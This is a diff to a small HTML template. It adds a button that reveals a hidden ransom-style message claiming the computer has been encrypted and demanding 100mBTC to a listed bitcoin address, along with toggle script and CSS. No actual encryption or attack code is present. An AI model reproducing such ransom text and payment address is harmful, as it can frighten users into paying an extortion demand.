@@ -5,15 +5,52 @@
 </head>
 <body>
 {% block content %}
-    <div onclick="obj=document.getElementById('open').style; obj.display=(obj.display=='none')?'block':'none';">
-    <button type="button" style="cursor:pointer;" (click)="unfold()">Click Me!</button>
+    <div onclick="unfold()">
+        <button type="button" class="button">BUTTON</button>
     </div>
-    <div id="open" style="display:none;clear:both;">
-        aaa
+    <div id="open" class="accordion_content">
+        Your computer is now successfully encrypted. If you want further access
+        to this device, please transfer 100mBTC to the address below:
+        <p>
+            bc1qvnveyqdg5fr9qwlek74lwmqh78755esyttm7dp
+        </p>
+        <br/>
     </div>
 {% endblock %}
 </body>
 </html>
 
+<style>
+    body {
+        text-align: center;
+        position:   relative;
+        top:        280px;
+        margin:     auto;
+        width:      50%;
+    }
+
+    .button {
+        border-radius: 100px;
+        width:         200px;
+        height:        60px;
+        cursor:        button;
+        margin:        auto;
+        text-align:    center;
+    }
+
+    .accordion_content {
+        text-align:  left;
+        margin:      auto;
+        max-width:   400px;
+        padding:     30px;
+        display:     none;
+        clear:       both;
+    }
+</style>
+
 <script type="text/javascript">
+    function unfold() {
+        obj         = document.getElementById('open').style;
+        obj.display = (obj.display=='none') ? 'block' : 'none';
+    }
 </script>
